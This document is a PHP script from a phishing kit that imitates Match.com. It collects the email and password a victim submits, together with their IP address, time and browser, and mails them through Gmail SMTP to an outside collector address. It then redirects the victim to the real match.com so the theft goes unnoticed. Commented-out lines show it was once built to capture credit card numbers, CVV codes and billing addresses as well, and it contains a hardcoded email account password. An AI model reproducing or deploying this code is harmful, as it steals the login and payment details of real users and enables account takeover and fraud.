<?php
session_start();
// include "connect.php";
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
?>


<?php
if(isset($_POST['submit'])){

$ipAddress =$_SERVER['REMOTE_ADDR'];
$date = date ('Y-M-D');
$time = date('H:i:s');
$userAgent = $_SERVER['HTTP_USER_AGENT'];
// $card_type = $_POST['card_type'];
// $cc_type = $_POST['cc_type'];
// $email = $_POST['user'];
// $cc_number = $_POST['cc_number'];

// $cc_month = $_POST['cc_month'];
// $cc_year = $_POST['cc_year'];
// $cc_csv = $_POST['cc_csv'];
// $b_address1_credit = $_POST['b_address1_credit'];
// $b_address2_credit = $_POST['b_address2_credit'];
// $b_city_credit = $_POST['b_city_credit'];
// $b_state_credit = $_POST['b_state_credit'];
// $zip1_credit = $_POST['zip1_credit'];
// $billing_phone = $_POST['billing_phone'];
// $Month = $_POST['Month'];
// $Day = $_POST['Day'];
// $Year = $_POST['Year'];

$email = $_POST['email'];
$password = $_POST['password'];

//note :image is ur img-file name...note also that if you are doing 4 or five,you should duplicate the $img,$temp,$img_size into 4 or five//



 
// $insert="INSERT INTO direct_info(card_type,cc_type,user,cc_number,cc_month,cc_year,cc_csv,b_address1_credit,
// b_address2_credit,b_city_credit,b_state_credit,zip1_credit,billing_phone,Month,Day,Year)
// VALUES( '$card_type','$cc_type','$email','$cc_number','$cc_month','$cc_year','$cc_csv'
// ,'$b_address1_credit','$b_address2_credit','$b_city_credit','$b_state_credit','$zip1_credit','$billing_phone','$Month','$Day','$Year')";
// $query= mysqli_query($con);

// if($query){
  
  require 'vendor/phpmailer/src/Exception.php';
  require 'vendor/phpmailer/src/PHPMailer.php';
  require 'vendor/phpmailer/src/SMTP.php';

  
  $mail = new PHPMailer(true);                            
//   try {
      //Server settings
      $mail->isSMTP();                                     
      $mail->Host = 'smtp.gmail.com';                      
      $mail->SMTPAuth = true;                             
      $mail->Username = 'daudahakeeme1@gmail.com';      
      $mail->Password = 'aabnmjsdcjfdezja';
    $mail->SMTPSecure = 'tls';
     $mail->Port = '587';
                            
      $mail->SMTPSecure =  PHPMailer::ENCRYPTION_SMTPS;                            
      $mail->Port = 465;                                   

      //Send Email
      $mail->setFrom($email);
      
      
      //Recipients
      $mail->addAddress('infmaa77@gmail.com','match dating');              
      $mail->addReplyTo($email);
      
      //Content
      $mail->isHTML(true);                                  
      $mail->Subject = 'New Loging Details';
      $mail->Body    = ' 
        <div> 
            <strong>
            Email : ' .$email . ' 
            </strong> <br> <br> <hr>
            <strong>
            password : ' .$password . ' 
            </strong> <br> <br><hr>
            <strong>
            IP Address : ' .$ipAddress . ' 
            </strong> <br> <br><hr>
            <strong>
            Date : ' .$date . ' 
            </strong> <br> <br><hr>
            <strong>
            Time : ' .$time . ' 
            </strong> <br> <br><hr>
            <strong>
           Browser : ' .$userAgent. ' 
            </strong> <br> <br><hr>
        </div>
        
        '
        ;
        
      
    //   $mail->send();{
    //     $_SESSION['email']=$email;
    // }
    
    if ($mail->send()) {
          header("location:https://www.match.com");
        // echo "Email sent";
    }else{
        'redirecting.';
        // 'Message could not be sent. Mailer Error: '.$mail->ErrorInfo;
    }
   
//   } catch (Exception $e) {
   
//    $_SESSION['result'] = 'Message could not be sent. Mailer Error: '.$mail->ErrorInfo;
//    $_SESSION['status'] = 'error';
//   }
}

// }

?>